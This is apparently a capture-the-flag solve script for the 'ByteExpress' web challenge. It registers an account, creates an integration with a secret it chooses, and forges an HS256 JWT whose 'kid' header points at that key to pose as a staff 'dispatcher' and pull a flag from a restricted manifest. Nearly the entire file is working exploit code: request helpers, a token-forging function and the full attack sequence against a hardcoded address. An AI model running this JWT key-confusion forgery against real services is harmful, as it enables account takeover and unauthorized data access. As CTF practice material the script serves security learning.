#!/usr/bin/env python3
"""
ByteExpress / web404 -- Cyberblitz '26 solve (one-shot).

Chain:
  1. Register + login a normal customer account  -> get a valid HS256 JWT (cookie: token)
  2. POST /api/integrations to mint a carrier integration. The server returns
     signing_reference (== key_id), e.g. "integrations/37/forge1.key", and stores
     the secret WE chose.
  3. JWT verification resolves the signing secret purely from the token's `kid`
     header, with no namespace allow-list. So a token with
        kid = integrations/<our id>/<our name>.key
     verifies against OUR secret -> full control over the token payload.
     (Path traversal in kid is also resolved, e.g. "integrations/37/../37/x.key".)
  4. /api/dispatch/* authorizes on the `sub` claim alone. "dispatcher" is a staff
     principal -> 200.
  5. CYB-404 sits in the "lost" queue; its manifest holds the flag.

Usage: python3 solve.py [base_url]
"""
import base64
import hashlib
import hmac
import json
import secrets
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://45.77.247.35:22005").rstrip("/")


# ---------------------------------------------------------------- http helpers
def request(method, path, *, body=None, headers=None, cookie=None):
    url = BASE + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("User-Agent", "Mozilla/5.0")
    if body is not None:
        req.add_header("Content-Type", "application/json")
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    if cookie:
        req.add_header("Cookie", f"token={cookie}")

    opener = urllib.request.build_opener(NoRedirect)
    try:
        resp = opener.open(req, timeout=20)
        return resp.status, resp.read().decode("utf-8", "replace"), resp.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), e.headers


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


def form(path, fields, cookie=None):
    """POST application/x-www-form-urlencoded, return (status, body, headers)."""
    req = urllib.request.Request(
        BASE + path,
        data=urllib.parse.urlencode(fields).encode(),
        method="POST",
    )
    req.add_header("User-Agent", "Mozilla/5.0")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    if cookie:
        req.add_header("Cookie", f"token={cookie}")
    opener = urllib.request.build_opener(NoRedirect)
    try:
        r = opener.open(req, timeout=20)
        return r.status, r.read().decode("utf-8", "replace"), r.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), e.headers


def api(method, path, body=None, cookie=None):
    status, text, _ = request(method, path, body=body, cookie=cookie)
    try:
        return status, json.loads(text)
    except json.JSONDecodeError:
        return status, text


# ---------------------------------------------------------------- jwt minting
def b64u(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def mint(kid: str, secret: str, **claims) -> str:
    payload = {"iat": int(time.time()), "exp": int(time.time()) + 3600, **claims}
    header = {"alg": "HS256", "kid": kid, "typ": "JWT"}
    h = b64u(json.dumps(header, separators=(",", ":")).encode())
    p = b64u(json.dumps(payload, separators=(",", ":")).encode())
    signing = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing, hashlib.sha256).digest()
    return f"{h}.{p}.{b64u(sig)}"


# ---------------------------------------------------------------------- solve
def main() -> int:
    user = "bx" + secrets.token_hex(4)
    pw = "Passw0rd!" + secrets.token_hex(3)
    print(f"[1] registering customer {user}")
    form("/register", {"username": user, "password": pw, "password_confirmation": pw})

    print("[2] logging in")
    _, _, hdrs = form("/login", {"username": user, "password": pw})
    sc = hdrs.get("Set-Cookie", "")
    if "token=" not in sc:
        print("    login failed:", sc)
        return 1
    customer_token = sc.split("token=", 1)[1].split(";", 1)[0]

    status, who = api("GET", "/account", cookie=customer_token)
    print(f"[3] session works: GET /account -> {status}")

    print("[4] minting a carrier integration (we choose the HS256 secret)")
    integ_secret = "topsecret" + secrets.token_hex(6)
    name = "forge" + secrets.token_hex(3)
    status, created = api(
        "POST",
        "/api/integrations",
        {"name": name, "webhook_url": "https://example.invalid/h", "secret": integ_secret},
        cookie=customer_token,
    )
    print(f"    -> {status} {created}")
    kid = created["signing_reference"]

    print("[5] minting a staff token: same kid+secret, sub=dispatcher")
    staff_token = mint(kid, integ_secret, sub="dispatcher", aud="byteexpress")

    status, queues = api("GET", "/api/dispatch/queues", cookie=staff_token)
    print(f"[6] GET /api/dispatch/queues -> {status} {queues}")

    status, parcels = api(
        "GET", "/api/dispatch/parcels?status=lost", cookie=staff_token
    )
    print(f"[7] GET /api/dispatch/parcels?status=lost -> {status}")
    print(f"    {json.dumps(parcels)}")

    status, manifest = api(
        "GET", "/api/dispatch/manifests/CYB-404", cookie=staff_token
    )
    print(f"[8] GET /api/dispatch/manifests/CYB-404 -> {status}")
    print(f"    {json.dumps(manifest, indent=2)}")

    if isinstance(manifest, dict) and manifest.get("contents"):
        print(f"\n    FLAG: {manifest['contents']}")
        return 0
    print("\n    no flag returned")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())